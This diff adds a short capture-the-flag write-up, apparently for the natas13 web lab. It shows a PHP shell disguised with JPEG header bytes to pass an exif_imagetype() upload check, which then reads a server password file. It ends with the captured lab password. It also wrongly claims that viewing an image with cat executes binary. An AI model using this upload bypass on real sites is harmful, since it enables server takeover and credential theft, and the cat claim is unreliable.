@@ -1,0 +1,25 @@
+This lab had the same setup as the last one but it warns you that it now checks
+if you actually uploaded an image. If you examine the code you'll see that it
+does this solely with the exif_imagetype() function from the php standard
+library. It does this by examining signatures at the beginning of a file. I read
+that these signatures had hex values ffd8. I couldn't get this to work.
+
+For my solution I just copied several lines from a real .jpeg image and pasted
+it at the top of my php script. To do this I viewed the image in text mode using
+emacs. I would not recommend using cat or head on an image file because this
+will cause binary to be executed on your computer. After putting this text at
+the top of my php file (before the <?php) I followed the same steps as I did for
+natas12.
+
+My php script looked like this:
+
+ÿØÿà\0JFIF\0\0\0\0\0\0ÿÛ\0„\0	4!%-6&&57.1/ 383,7(-.+
+<?php
+
+echo "<br>".shell_exec("cat /etc/natas_webpass/natas14");
+
+?>
+
+I added a break tag to visually separate the password text from the junk binary.
+
+natas14 password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
